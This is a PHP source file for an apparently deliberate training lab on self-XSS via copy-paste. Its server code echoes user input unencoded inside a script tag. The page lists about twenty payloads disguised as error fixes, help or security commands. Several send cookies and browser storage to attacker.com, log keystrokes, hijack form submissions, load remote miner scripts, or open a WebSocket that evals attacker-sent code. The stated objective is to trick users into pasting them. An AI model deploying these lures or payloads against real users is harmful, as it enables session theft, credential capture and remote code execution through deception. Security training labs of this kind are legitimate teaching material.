<?php
// Lab 3: Self-XSS via Copy-Paste
// Vulnerability: Self-XSS through copy-paste functionality

session_start();

$message = '';
$user_input = '';
$executed_code = '';

// Simulate Self-XSS vulnerability through copy-paste
function process_copy_paste_xss($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle Self-XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_code'])) {
    $user_input = $_POST['code_input'] ?? '';
    
    if ($user_input) {
        $executed_code = process_copy_paste_xss($user_input);
        $message = '<div class="alert alert-success">Code executed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: Self-XSS via Copy-Paste - Self-XSS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .executed-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .copy-paste-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .copy-paste-example {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Self-XSS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: Self-XSS via Copy-Paste</h1>
            <p class="hero-subtitle">Self-XSS through copy-paste functionality</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates Self-XSS vulnerabilities that are exploited through copy-paste functionality. Attackers trick users into copying and pasting malicious JavaScript code, often disguised as helpful commands, error fixes, or legitimate code snippets.</p>
            <p><strong>Objective:</strong> Use copy-paste techniques to trick users into executing malicious JavaScript.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output without validation
function process_copy_paste_xss($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-clipboard me-2"></i>Copy-Paste Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="copy-paste-warning">
                            <h5>⚠️ Copy-Paste Warning</h5>
                            <p>This lab demonstrates copy-paste attacks. Common techniques include:</p>
                            <ul>
                                <li>Disguising malicious code as helpful commands</li>
                                <li>Creating fake error messages with "fix" code</li>
                                <li>Using legitimate-looking code snippets</li>
                                <li>Exploiting copy-paste functionality</li>
                            </ul>
                        </div>
                        
                        <div class="copy-paste-example">
                            <h5>📋 Copy-Paste Example</h5>
                            <p><strong>Fake Error Fix:</strong></p>
                            <p>"Copy this code to fix the error: <code>alert('Fixed!')</code>"</p>
                            <p><strong>Fake Help Command:</strong></p>
                            <p>"Paste this to get help: <code>console.log('Help loaded')</code>"</p>
                        </div>
                        
                        <div class="input-info">
                            <h5>Copy-Paste Examples</h5>
                            <p>Try these copy-paste payloads:</p>
                            <ul>
                                <li><code>alert('Pasted!')</code> - Basic paste test</li>
                                <li><code>console.log('Code pasted')</code> - Console output</li>
                                <li><code>document.title = 'Pasted'</code> - Change title</li>
                                <li><code>document.body.innerHTML = 'Pasted!'</code> - Change content</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_code" value="1">
                            <div class="mb-3">
                                <label for="code_input" class="form-label">JavaScript Code to Execute</label>
                                <textarea class="form-control" id="code_input" name="code_input" 
                                          rows="4" placeholder="Enter JavaScript code..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Code</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($executed_code): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Executed Code
                    </div>
                    <div class="card-body">
                        <div class="executed-display">
                            <h5>JavaScript Output</h5>
                            <div class="sensitive-data">
                                <script>
                                    try {
                                        <?php echo $executed_code; ?>
                                    } catch(e) {
                                        console.error('Error executing code:', e);
                                    }
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Self-XSS via Copy-Paste</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Copy-paste leading to code execution</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Copy-Paste Techniques</h5>
                    <ul>
                        <li><strong>Disguise:</strong> Hide malicious code in helpful commands</li>
                        <li><strong>Fake Errors:</strong> Create fake error messages with "fix" code</li>
                        <li><strong>Legitimate Look:</strong> Use legitimate-looking code snippets</li>
                        <li><strong>Exploit:</strong> Exploit copy-paste functionality</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Copy-Paste Self-XSS Payloads</h5>
            <p>Use these copy-paste techniques to trick users into executing malicious JavaScript:</p>
            
            <h6>1. Fake Error Fixes:</h6>
            <div class="code-block">// Copy this code to fix the error:
alert('Error fixed!')

// Paste this to resolve the issue:
console.log('Issue resolved!')

// Run this to fix the problem:
document.title = 'Fixed!'

// Execute this to solve the error:
document.body.innerHTML = 'Error resolved!'</div>

            <h6>2. Fake Help Commands:</h6>
            <div class="code-block">// Copy this to get help:
console.log('Help loaded!')

// Paste this for assistance:
alert('Help activated!')

// Run this to enable help:
document.title = 'Help enabled!'

// Execute this for support:
document.body.innerHTML = 'Help enabled!'</div>

            <h6>3. Fake Debug Commands:</h6>
            <div class="code-block">// Copy this to debug:
console.log('Debug mode enabled!')

// Paste this to start debugging:
alert('Debug started!')

// Run this to enable debug mode:
document.title = 'Debug mode!'

// Execute this to debug:
document.body.innerHTML = 'Debug mode enabled!'</div>

            <h6>4. Fake Security Commands:</h6>
            <div class="code-block">// Copy this to secure your account:
alert('Account secured!')

// Paste this to enable security:
console.log('Security enabled!')

// Run this to activate security:
document.title = 'Security activated!'

// Execute this to secure:
document.body.innerHTML = 'Security enabled!'</div>

            <h6>5. Fake Update Commands:</h6>
            <div class="code-block">// Copy this to update:
alert('Update complete!')

// Paste this to apply updates:
console.log('Updates applied!')

// Run this to update:
document.title = 'Updated!'

// Execute this to update:
document.body.innerHTML = 'Updated!'</div>

            <h6>6. Fake Maintenance Commands:</h6>
            <div class="code-block">// Copy this for maintenance:
alert('Maintenance complete!')

// Paste this to maintain:
console.log('Maintenance done!')

// Run this to maintain:
document.title = 'Maintained!'

// Execute this to maintain:
document.body.innerHTML = 'Maintenance complete!'</div>

            <h6>7. Fake Data Backup Commands:</h6>
            <div class="code-block">// Copy this to backup data:
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
alert('Data backed up!')</div>

            <h6>8. Fake Form Security Commands:</h6>
            <div class="code-block">// Copy this to secure forms:
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}
alert('Forms secured!')</div>

            <h6>9. Fake Keylogger Commands:</h6>
            <div class="code-block">// Copy this to monitor keystrokes:
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})
console.log('Keystroke monitoring enabled!')
alert('Keystroke monitoring enabled!')</div>

            <h6>10. Fake Session Security Commands:</h6>
            <div class="code-block">// Copy this to secure session:
var sessionData = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/session', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(sessionData)
})
alert('Session secured!')</div>

            <h6>11. Fake Cryptocurrency Commands:</h6>
            <div class="code-block">// Copy this to mine cryptocurrency:
var script = document.createElement('script')
script.src = 'https://attacker.com/miner.js'
document.head.appendChild(script)
console.log('Mining started!')
alert('Mining started!')</div>

            <h6>12. Fake Reverse Shell Commands:</h6>
            <div class="code-block">// Copy this for remote support:
var ws = new WebSocket('ws://attacker.com:8080')
ws.onopen = function() {
    ws.send('Connected')
}
ws.onmessage = function(event) {
    eval(event.data)
}
console.log('Remote support connected!')
alert('Remote support connected!')</div>

            <h6>13. Fake Persistence Commands:</h6>
            <div class="code-block">// Copy this for persistence:
var payload = 'alert("Persistent!")'
localStorage.setItem('persistent', payload)
if (localStorage.getItem('persistent')) {
    eval(localStorage.getItem('persistent'))
}
console.log('Persistence enabled!')
alert('Persistence enabled!')</div>

            <h6>14. Fake DOM Security Commands:</h6>
            <div class="code-block">// Copy this to secure DOM:
var element = document.createElement('div')
element.id = 'security'
element.innerHTML = '<script>alert("DOM secured!")</script>'
document.body.appendChild(element)
console.log('DOM secured!')
alert('DOM secured!')</div>

            <h6>15. Fake Event Handler Commands:</h6>
            <div class="code-block">// Copy this to secure events:
var element = document.createElement('div')
element.onclick = function() { alert('Event secured!') }
element.innerHTML = 'Click to verify security'
element.style.cssText = 'background: green; color: white; padding: 10px; cursor: pointer;'
document.body.appendChild(element)
console.log('Events secured!')
alert('Events secured!')</div>

            <h6>16. Fake CSS Security Commands:</h6>
            <div class="code-block">// Copy this to secure CSS:
var style = document.createElement('style')
style.innerHTML = 'body { background: linear-gradient(45deg, #00ff00, #008000) !important; }'
document.head.appendChild(style)
console.log('CSS secured!')
alert('CSS secured!')</div>

            <h6>17. Fake Advanced Security Commands:</h6>
            <div class="code-block">// Copy this for advanced security:
(function() {
    var script = document.createElement('script')
    script.src = 'https://attacker.com/security.js'
    document.head.appendChild(script)
    console.log('Advanced security loaded!')
    alert('Advanced security loaded!')
})()</div>

            <h6>18. Fake Complete Security Suite:</h6>
            <div class="code-block">// Copy this for complete security:
console.log('Security Suite v3.0 loaded!')
alert('Security Suite v3.0 loaded!')

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})

// Form hijacking
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}

// Data exfiltration
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})

console.log('Complete security suite activated!')
alert('Complete security suite activated!')</div>

            <h6>19. Fake Data Exfiltration Commands:</h6>
            <div class="code-block">// Copy this to backup all data:
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href,
    referrer: document.referrer
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
console.log('All data backed up!')
alert('All data backed up!')</div>

            <h6>20. Fake Form Hijacking Commands:</h6>
            <div class="code-block">// Copy this to secure all forms:
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
        alert('Form secured!')
    })
}
console.log('All forms secured!')
alert('All forms secured!')</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Social engineering and user manipulation</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed content</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual JavaScript execution patterns</li>
                    <li>Educate users about Self-XSS risks and copy-paste attacks</li>
                    <li>Implement user awareness training programs</li>
                    <li>Warn users about pasting code from untrusted sources</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
